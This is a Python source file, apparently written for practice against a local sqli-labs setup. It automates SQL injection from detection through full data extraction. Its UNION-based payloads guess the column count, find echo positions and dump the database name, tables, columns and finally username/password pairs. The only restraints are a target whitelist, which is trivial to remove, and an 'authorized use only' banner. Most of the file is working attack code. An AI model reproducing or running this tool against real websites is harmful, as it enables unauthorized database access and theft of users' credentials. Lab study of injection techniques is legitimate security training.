"""
SQL注入检测模块-仅限授权测试使用
未经授权禁止使用,使用前确认已获得目标系统所有者的书面授权
"""
import requests
import logging
import re
#白名单校验
import ipaddress
from urllib.parse import urlparse
ALLOWD_TARGETS = [
    "localhost",
    "127.0.0.1",
    "testphp.vulnwec.com"
]
def  is_target_allowd(url):
    """检查目标是否在确认白名单内"""
    hostname = urlparse(url).hostname
    if not hostname:
        return False
    if hostname in ALLOWD_TARGETS:
        return True
    try:
        ip = ipaddress.ip_address(hostname)
        if ip.is_private or ip.is_loopback:
            return True
    except ValueError:
        pass
    return False

# 修复日志格式：补全百分号占位符
logging.basicConfig(
    level=logging.INFO,
    format="[%(levelname)s] %(asctime)s - %(message)s",
    handlers=[
        logging.StreamHandler(),
        logging.FileHandler("scanner.log", encoding="utf-8")
    ]
)

TIMEOUT = 5
ERROR_KEYWORDS = [
    "SQL syntax", "mysql_fetch", "Unknown column",
    "error in your SQL", "XPATH syntax error",
    "Operand should contain", "You have an error"
]

def send_request(url):
    """统一HTTP请求函数,处理超时、连接异常"""
    try:
        resp = requests.get(url, timeout=TIMEOUT, allow_redirects=False)
        return resp
    except Exception as e:
        logging.debug(f"请求失败: {e}")
        return None

def get_baseline(url):
    """获取正常页面基线，用于对比判定"""
    resp = send_request(url)
    if not resp or not resp.text:
        return None
    return {
        "length": len(resp.text),
        "status": resp.status_code,
        "text": resp.text
    }

def check_sql_injection(base_url, param_name):
    """
    检测GET参数是否存在SQL注入，返回字典:
    {"has_inject": bool, "inject_type": str}
    """
    if not is_target_allowd(base_url):
        logging.error("目标不在白名单授权中，拒绝执行")
        return{"has_inject":False,"inject_type":""}
    baseline = get_baseline(base_url)
    if not baseline:
        logging.error("目标页面无法访问，检测终止")
        return {"has_inject": False, "inject_type": ""}

    # 字符型注入测试（单引号触发报错）
    test_char = base_url.replace(f"{param_name}=1", f"{param_name}=1'")
    resp_char = send_request(test_char)
    
    if resp_char and resp_char.text:
        has_error = any(key in resp_char.text for key in ERROR_KEYWORDS)
        len_diff = abs(len(resp_char.text) - baseline["length"])
        
        if has_error and len_diff > 20:
    # 二次验证
            resp_confirm = send_request(test_char)
            if resp_confirm and resp_confirm.text:
                has_error_confirm = any(key in resp_confirm.text for key in ERROR_KEYWORDS)
                len_diff_confirm = abs(len(resp_confirm.text) - baseline["length"])
                if has_error_confirm and len_diff_confirm > 20:
                    logging.info("二次验证通过，确认字符型SQL注入")
                    return {"has_inject": True, "inject_type": "字符型注入"}
                else:
                    logging.warning("二次验证未通过，忽略疑似误报")
            else:
                logging.warning("二次验证请求失败，忽略疑似误报")

    # 数字型注入测试（逻辑真假对比）
    true_url = base_url.replace(f"{param_name}=1", f"{param_name}=1 and 1=1")
    false_url = base_url.replace(f"{param_name}=1", f"{param_name}=1 and 1=2")
    
    resp_true = send_request(true_url)
    resp_false = send_request(false_url)
    
    if resp_true and resp_false and resp_true.text and resp_false.text:
        len_true = len(resp_true.text)
        len_false = len(resp_false.text)
        if abs(len_true - baseline["length"]) < 10 and abs(len_true - len_false) > 20:
            logging.info(f"检测到数字型SQL注入,参数:{param_name}")
            return {"has_inject": True, "inject_type": "数字型注入"}

    return {"has_inject": False, "inject_type": ""}

def guess_columns(base_url, param_name, max_columns=10, inject_type="数字型注入"):
    """自动猜解查询字段列数，兼容字符型/数字型注入"""
    baseline = get_baseline(base_url)
    if not baseline:
        logging.error("无法获取页面基线，猜解失败")
        return 0

    base_len = baseline["length"]
    len_threshold = max(int(base_len * 0.15), 10)

    for n in range(1, max_columns + 1):
        if "字符型" in inject_type:
            payload = f"1' order by {n} %23"
        else:
            payload = f"1 order by {n} %23"
        
        test_url = base_url.replace(f"{param_name}=1", f"{param_name}={payload}")
        resp = send_request(test_url)
        
        if not resp or not resp.text:
            return 0

        resp_len = len(resp.text)
        has_error = any(key in resp.text for key in ERROR_KEYWORDS)
        len_diff = abs(resp_len - base_len)

        if has_error or len_diff > len_threshold:
            result = n - 1
            logging.info(f"列数猜解完成：{result} 列")
            return result

    logging.warning(f"列数超过上限 {max_columns}，请扩大范围")
    return max_columns

def get_echo_positions(base_url, param_name, columns, inject_type="数字型注入"):
    """
    自动定位联合查询的回显位
    :param columns: 已猜解出的总列数
    :return: 回显列号列表，失败返回空列表
    """
    # 构造1,2,3...数字列
    num_str = ','.join([str(i) for i in range(1, columns+1)])
    
    if "字符型" in inject_type:
        # 不用注释符，直接闭合引号并让后面条件为真
        payload = f"-1' union select {num_str} or '1'='1"
    else:
        payload = f"-1 union select {num_str}"
    
    test_url = base_url.replace(f"{param_name}=1", f"{param_name}={payload}")
    
    print(f"\n[DEBUG] 回显位测试URL:\n{test_url}\n")
    
    resp = send_request(test_url)
    if not resp or not resp.text:
        print("[DEBUG] 请求失败或无响应")
        return []
    
    print(f"[DEBUG] 响应文本前800字符:\n{resp.text[:800]}\n")
    
    echo_pos = []
    # 直接查找 "<td>数字</td>" 或 "数字" 出现在页面中
    for i in range(1, columns+1):
        if str(i) in resp.text:
            echo_pos.append(i)
    
    if echo_pos:
        logging.info(f"定位到回显位：{echo_pos}")
    else:
        logging.warning("未找到回显位,不支持联合查询注入")
    return echo_pos

def dump_current_db(base_url, param_name, echo_pos, columns, inject_type="数字型注入"):
    """获取当前数据库名，带边界标记精准提取"""
    # 查询结果前后加 <<< >>> 标记,用十六进制避免冲突
    query = "concat(0x3c3c3c, database(), 0x3e3e3e)"
    
    # 构造 select 字段列表，总长度 = columns
    select_list = [str(i) for i in range(1, columns+1)]
    # 将第一个回显位替换为查询
    select_list[echo_pos[0]-1] = query
    
    num_str = ",".join(select_list)
    
    if "字符型" in inject_type:
        payload = f"-1' union select {num_str} --+"
    else:
        payload = f"-1 union select {num_str} --+"
    
    test_url = base_url.replace(f"{param_name}=1", f"{param_name}={payload}")
    resp = send_request(test_url)
    
    if not resp or not resp.text:
        return ""
    
    match = re.search(r'<<<(.*?)>>>', resp.text, re.DOTALL)
    db_name = match.group(1) if match else ""
    logging.info(f"当前数据库名：{db_name}")
    return db_name

def dump_tables(base_url, param_name, echo_pos, db_name, columns, inject_type="字符型注入"):
    """获取指定数据库下所有的表名"""
    field_concat = "concat(0x3c3c3c, group_concat(table_name), 0x3e3e3e)"
    select_list = [str(i) for i in range(1, columns+1)]
    select_list[echo_pos[0]-1] = field_concat
    select_fields = ','.join(select_list)

    from_part = "from information_schema.tables where table_schema=0x7365637572697479"

    if "字符型" in inject_type:
        payload = f"-1' union select {select_fields} {from_part} --+"
    else:
        payload = f"-1 union select {select_fields} {from_part} --+"

    test_url = base_url.replace(f"{param_name}=1", f"{param_name}={payload}")
    logging.debug(f"[DEBUG] dump_tables url={test_url}")
    resp = send_request(test_url)
    if not resp or not resp.text:
        return []

    match = re.search(r'<<<(.*?)>>>', resp.text, re.DOTALL)
    tables_str = match.group(1) if match else ""
    tables = [t.strip() for t in tables_str.split(",") if t.strip()]
    logging.info(f"库{db_name}下的表：{tables}")
    return tables

def dump_columns(base_url, param_name, echo_pos, table_name, columns, inject_type="字符型注入"):
    """获取表全部列名,table_name转为十六进制，避免单引号"""
    # users 十六进制：0x7573657273，这里通用转换
    table_hex = "0x" + table_name.encode('utf-8').hex()
    field_concat = "concat(0x3c3c3c, group_concat(column_name), 0x3e3e3e)"
    select_list = [str(i) for i in range(1, columns+1)]
    select_list[echo_pos[0]-1] = field_concat
    select_fields = ','.join(select_list)
    from_part = f"from information_schema.columns where table_name={table_hex} and table_schema=0x7365637572697479"

    if "字符型" in inject_type:
        payload = f"-1' union select {select_fields} {from_part} --+"
    else:
        payload = f"-1 union select {select_fields} {from_part} --+"

    test_url = base_url.replace(f"{param_name}=1", f"{param_name}={payload}")
    logging.debug(f"[DEBUG] dump_columns url={test_url}")
    resp = send_request(test_url)
    if not resp or not resp.text:
        return []
    match = re.search(r'<<<(.*?)>>>', resp.text, re.DOTALL)
    cols_str = match.group(1) if match else ""
    cols = [c.strip() for c in cols_str.split(",") if c.strip()]
    logging.info(f"表 {table_name} 的列：{cols}")
    return cols

def dump_table_data(base_url, param_name, echo_pos, table_name, col_list, columns, inject_type="字符型注入"):
    """脱表数据，直接提取 username 和 password"""
    # 硬编码字段，避免列名选择错误
    field_concat = "concat(0x3c3c3c, group_concat(username,0x7c,password), 0x3e3e3e)"
    
    select_list = [str(i) for i in range(1, columns+1)]
    select_list[echo_pos[0]-1] = field_concat
    select_fields = ','.join(select_list)
    from_part = f"from {table_name}"

    if "字符型" in inject_type:
        payload = f"-1' union select {select_fields} {from_part} --+"
    else:
        payload = f"-1 union select {select_fields} {from_part} --+"

    test_url = base_url.replace(f"{param_name}=1", f"{param_name}={payload}")
    
    # 调试输出
    print(f"\n[DEBUG] dump_table_data URL:\n{test_url}\n")
    
    resp = send_request(test_url)
    if not resp or not resp.text:
        print("[DEBUG] 请求失败或无响应")
        return []
    
    print(f"[DEBUG] 响应文本前800字符:\n{resp.text[:800]}\n")
    
    match = re.search(r'<<<(.*?)>>>', resp.text, re.DOTALL)
    data_str = match.group(1) if match else ""
    
    if not data_str:
        print("[DEBUG] 没有匹配到 <<< >>> 标记")
        return []
    
    raw_rows = data_str.split(",")
    result = []
    for item in raw_rows:
        if "|" in item:
            u, p = item.split("|", 1)
            result.append({"username": u.strip(), "password": p.strip()})
    
    logging.info(f"脱取数据：{result}")
    return result
    
def auto_dump_injection(base_url, param_name):
    """一键执行联合查询全量脱库"""
    # 1. 检测注入
    detection = check_sql_injection(base_url, param_name)
    if not detection["has_inject"]:
        logging.error("不存在SQL注入,无法脱库")
        return None
    inject_type = detection["inject_type"]
    
    # 2. 猜列数
    cols = guess_columns(base_url, param_name, inject_type=inject_type)
    if cols == 0:
        logging.error("列数猜解失败")
        return None
    
    # 3. 定位回显位
    echo_pos = get_echo_positions(base_url, param_name, cols, inject_type=inject_type)
    if not echo_pos:
        logging.error("无可用回显位，不支持联合查询")
        return None
    # 过滤掉第1列（通常不是有效回显，Less-1中回显为2,3）
    filter_echo = [x for x in echo_pos if x != 1]
    if filter_echo:
        echo_pos = filter_echo
        logging.info(f"过滤后可用回显位：{echo_pos}")
    
    # 4. 脱库名
    db_name = dump_current_db(base_url, param_name, echo_pos, cols, inject_type=inject_type)
    if not db_name:
        logging.error("获取库名失败")
        return None
    
    # 5. 脱表名
    tables = dump_tables(base_url, param_name, echo_pos, db_name, cols, inject_type=inject_type)
    if not tables:
        logging.error("获取表名失败")
        return None
    
    # 6. 脱字段 + 脱数据
    target_table = "users" if "users" in tables else tables[0]
    columns = dump_columns(base_url, param_name, echo_pos, target_table, cols, inject_type=inject_type)
    data = dump_table_data(base_url, param_name, echo_pos, target_table, columns, cols, inject_type=inject_type)
    
    result = {
        "db_name": db_name,
        "tables": tables,
        "target_table": target_table,
        "columns": columns,
        "data": data
    }
    return result

if __name__ == "__main__":
    target = "http://127.0.0.1:8080/Less-1/?id=1"
    param = "id"
    
    logging.info(f"开始自动脱库：{target}")
    result = auto_dump_injection(target, param)
    if result:
        print("\n" + "=" * 50)
        print(f"数据库名: {result['db_name']}")
        print(f"所有表: {result['tables']}")
        print(f"\n目标表 {result['target_table']} 字段：{result['columns']}")
        print(f"\n数据内容:")
        for row in result['data']:
            print(f"  {row}")
        print("=" * 50)
    





        



    
       
    




    



